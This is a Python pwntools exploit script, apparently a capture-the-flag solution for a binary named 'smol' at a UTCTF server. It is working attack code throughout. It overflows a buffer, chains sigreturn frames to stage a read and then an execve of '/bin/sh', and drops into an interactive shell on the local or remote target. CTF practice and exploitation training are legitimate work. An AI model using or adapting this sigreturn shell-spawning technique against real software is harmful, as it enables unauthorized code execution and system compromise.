from pwn import ELF, process, remote, log, p64, args, gdb, context, SigreturnFrame

context.arch = 'amd64'

OFFSET = 16
FILE = './smol'
BINARY = ELF(FILE)

READ_SYSCALL = 0x00401038
SYSCALL = 0x40100a
READ = 0x00401023
MAIN = 0x40100d

def start():
    if args.REMOTE:
        return remote('pwn.utctf.live', 9998)

    p =  process(FILE)
    if args.NOTRACE:
        return p

    gdb.attach(p)
    return p


p = start()
payload = b'a' * OFFSET
payload += p64(MAIN)
payload += p64(SYSCALL)

# create read frame
frame = SigreturnFrame()
frame.rax = 0x0
frame.rdi = 0x0
frame.rsi = 0x402000
frame.rdx = 0x1000
frame.rip = SYSCALL
frame.rsp = 0x402100
frame.rbp = 0x402100

payload += bytes(frame)
p.sendline(payload)
log.info('First payload sent')

input("Send second payload? ")
p.sendline(p64(READ) + b'b'*6)
log.info('Second payload sent')

payload = b'a'*0x100 + p64(READ_SYSCALL)
payload += p64(SYSCALL)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402208
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL
frame.rsp = 0x402008

payload += bytes(frame)
payload += b'\x90'*(0x200 - len(payload)) + b'/bin/sh\x00'

input("Send third payload? ")
p.sendline(payload)
log.info("Third payload sent")

input("Send fourth payload? ")
p.sendline(b'b'*14)
p.interactive()
